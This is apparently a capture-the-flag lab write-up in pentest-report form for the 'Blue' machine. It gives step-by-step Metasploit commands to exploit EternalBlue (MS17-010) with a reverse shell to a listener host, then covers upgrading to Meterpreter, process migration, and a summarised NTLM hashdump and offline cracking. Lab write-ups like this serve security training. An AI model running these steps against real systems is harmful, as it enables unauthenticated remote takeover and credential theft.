Executive Summary

The Blue machine runs Windows Server 2012 R2 and exposes an unpatched SMBv1 service vulnerable to EternalBlue (MS17-010). A vulnerability scan confirmed the exposure and Metasploit’s ms17_010_eternalblue module delivered a reverse shell as NT AUTHORITY. The shell was upgraded to a Meterpreter session using the shell_to_meterpreter post module, and the process was migrated to a stable SYSTEM-owned process. A hashdump extracted NTLM credentials for all local accounts, and Jon’s hash was cracked offline using CrackStation. All three flags were located and retrieved from the file system.

Reconnaissance

Objective

Identify open ports, running services, and any known vulnerabilities on the target.

Findings

An Nmap service and vulnerability scan was run against the target: nmap -sV -O --script vuln 10.114.157.205. The scan identified the following open ports:

  • 135/tcp — Microsoft Windows RPC
  • 139/tcp — NetBIOS-SSN
  • 445/tcp — Microsoft Windows Server 2008 R2 – 2012 microsoft-ds
  • 3389/tcp — Microsoft Terminal Service
  • 5985/tcp — Microsoft HTTPAPI httpd 2.0

OS detection identified the host as Microsoft Windows Server 2012 R2 Datacenter 9600 x64. The --script vuln flag runs Nmap’s vulnerability detection scripts alongside the service scan. The smb-vuln-ms17-010 script returned a critical finding on port 445: a Remote Code Execution vulnerability in Microsoft SMBv1 (CVE-2017-0143, Risk factor: HIGH), confirming the target was vulnerable to EternalBlue.

PoC:
- Tools used: Nmap
- Command: nmap -sV -O --script vuln 10.114.157.205
- Result: Port 445 confirmed vulnerable to MS17-010 (EternalBlue); OS identified as Windows Server 2012 R2 Datacenter x64

Enumeration

Objective

Identify specific vulnerabilities and attack vectors on the discovered services.

Findings

No dedicated enumeration phase was required for this machine. The Nmap --script vuln flag identified MS17-010 on port 445 directly, making further service-specific enumeration unnecessary. Port 445 (SMBv1) was the sole attack surface.

Exploitation — Initial Foothold

Description

EternalBlue (MS17-010) is a critical remote code execution vulnerability in Microsoft’s SMBv1 implementation. It allows an unauthenticated attacker to send specially crafted packets to port 445 and execute arbitrary code in the context of NT AUTHORITY. The vulnerability was confirmed during reconnaissance and exploited using Metasploit’s exploit/windows/smb/ms17_010_eternalblue module.

PoC — Steps to Reproduce

  1. Launch Metasploit and search for the EternalBlue exploit: search type:exploit MS17-010
  2. Load the exploit module: use exploit/windows/smb/ms17_010_eternalblue
  3. Set the payload: set payload windows/x64/shell/reverse_tcp
  4. Configure the target and listener: setg rhosts 10.114.157.205 and setg lhost 192.168.143.212
  5. Verify options with options — RHOSTS, LHOST, and LPORT 4444 confirmed
  6. Run the exploit: run — the first attempt failed with a socket reset error; a second run succeeded, opening Command shell session 1 as NT AUTHORITY
  7. The shell banner confirmed execution on the target: Microsoft Windows [Version 6.3.9600] at prompt C:\Windows\system32>

Post-Exploitation

Shell Upgrade to Meterpreter

The initial shell was a basic Windows command shell with limited capabilities. The post/multi/manage/shell_to_meterpreter module was used to upgrade it to a full Meterpreter session, enabling access to commands such as hashdump, search, and migrate.

PoC — Steps to Reproduce

  1. Search for the upgrade module: search type:post shell meterpreter
  2. Load the module: use post/multi/manage/shell_to_meterpreter
  3. Set the target session: set session 1
  4. Run the module: run — Meterpreter session 5 opened as NT AUTHORITY@ WIN-JO6REVNMMMMP but timed out shortly after
  5. Re-ran the module against the same session: Meterpreter session 8 opened successfully as NT AUTHORITY@ WIN-JO6REVNMMMMP and remained stable
  6. Interacted with the new session: sessions -i 8

Process Migration

Meterpreter sessions can become unstable if attached to short-lived or volatile processes. The process list was reviewed to identify a stable SYSTEM-owned process, and the session was migrated to it.

PoC — Steps to Reproduce

  1. List running processes: ps
  2. Identified cmd.exe (PID 2260) running as NT AUTHORITYas a suitable migration target
  3. Migrated the session: migrate 2260 — migration completed successfully from PID 1440 (powershell.exe)

Lessons Learned

EternalBlue remains one of the most impactful vulnerabilities ever disclosed. A single unpatched SMBv1 service on Windows Server 2012 R2 led to full SYSTEM-level compromise with no credentials required. Key takeaways:

The --script vuln flag in Nmap runs vulnerability detection scripts alongside a standard service scan, identifying MS17-010 in a single command without a dedicated scanner. EternalBlue is notable because it delivers code execution directly as SYSTEM, bypassing any privilege escalation step entirely — not all Windows compromises require a separate privesc phase.

The post/multi/manage/shell_to_meterpreter module is the standard way to upgrade a basic command shell to Meterpreter. It can fail on the first attempt; re-running it against the same session typically resolves the issue. After upgrading, process migration is important for session stability — migrating to a long-running SYSTEM process prevents the session from dying when the original host process exits.

NTLM hashes from hashdump can be cracked entirely offline using tools like CrackStation or Hashcat, without sending any additional traffic to the target. The three flags on this machine highlight three locations every Windows pentester should know: the system root (C:\), the SAM database directory (C:\Windows\System32\config), and a local user’s Documents folder (C:\Users\<username>\Documents).
